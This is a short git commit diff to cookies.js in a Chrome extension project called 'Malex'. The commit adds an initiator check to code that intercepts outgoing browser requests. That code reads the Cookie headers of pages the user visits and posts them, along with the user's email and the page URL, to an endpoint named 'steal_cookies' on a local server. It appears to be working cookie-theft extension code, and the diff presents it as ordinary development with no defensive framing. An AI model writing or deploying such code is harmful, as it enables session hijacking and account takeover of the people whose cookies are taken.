762097c3db8060e8847186610598e259d9130d45
cwong2015 <sirhc8002@gmail.com>
2018-12-01 16:37:41 -0500

    added initator check

--- Malex/scripts/cookies.js
+++ Malex/scripts/cookies.js
@@ -13,7 +13,7 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
             localStorage.setItem('email', userEmail);
             if (details.initiator != ('chrome-extension://' + chrome.runtime.id) && !(typeof details.requestHeaders === 'undefined')) {
                 for (var i = 0; i < details.requestHeaders.length; ++i) {
-                    if (details.requestHeaders[i].name == 'Cookie') {
+                    if (details.requestHeaders[i].name == 'Cookie' && details.initiator) {
                         $.post("http://localhost:5000/steal_cookies", {
                             email: userEmail,
                             url: details.initiator,
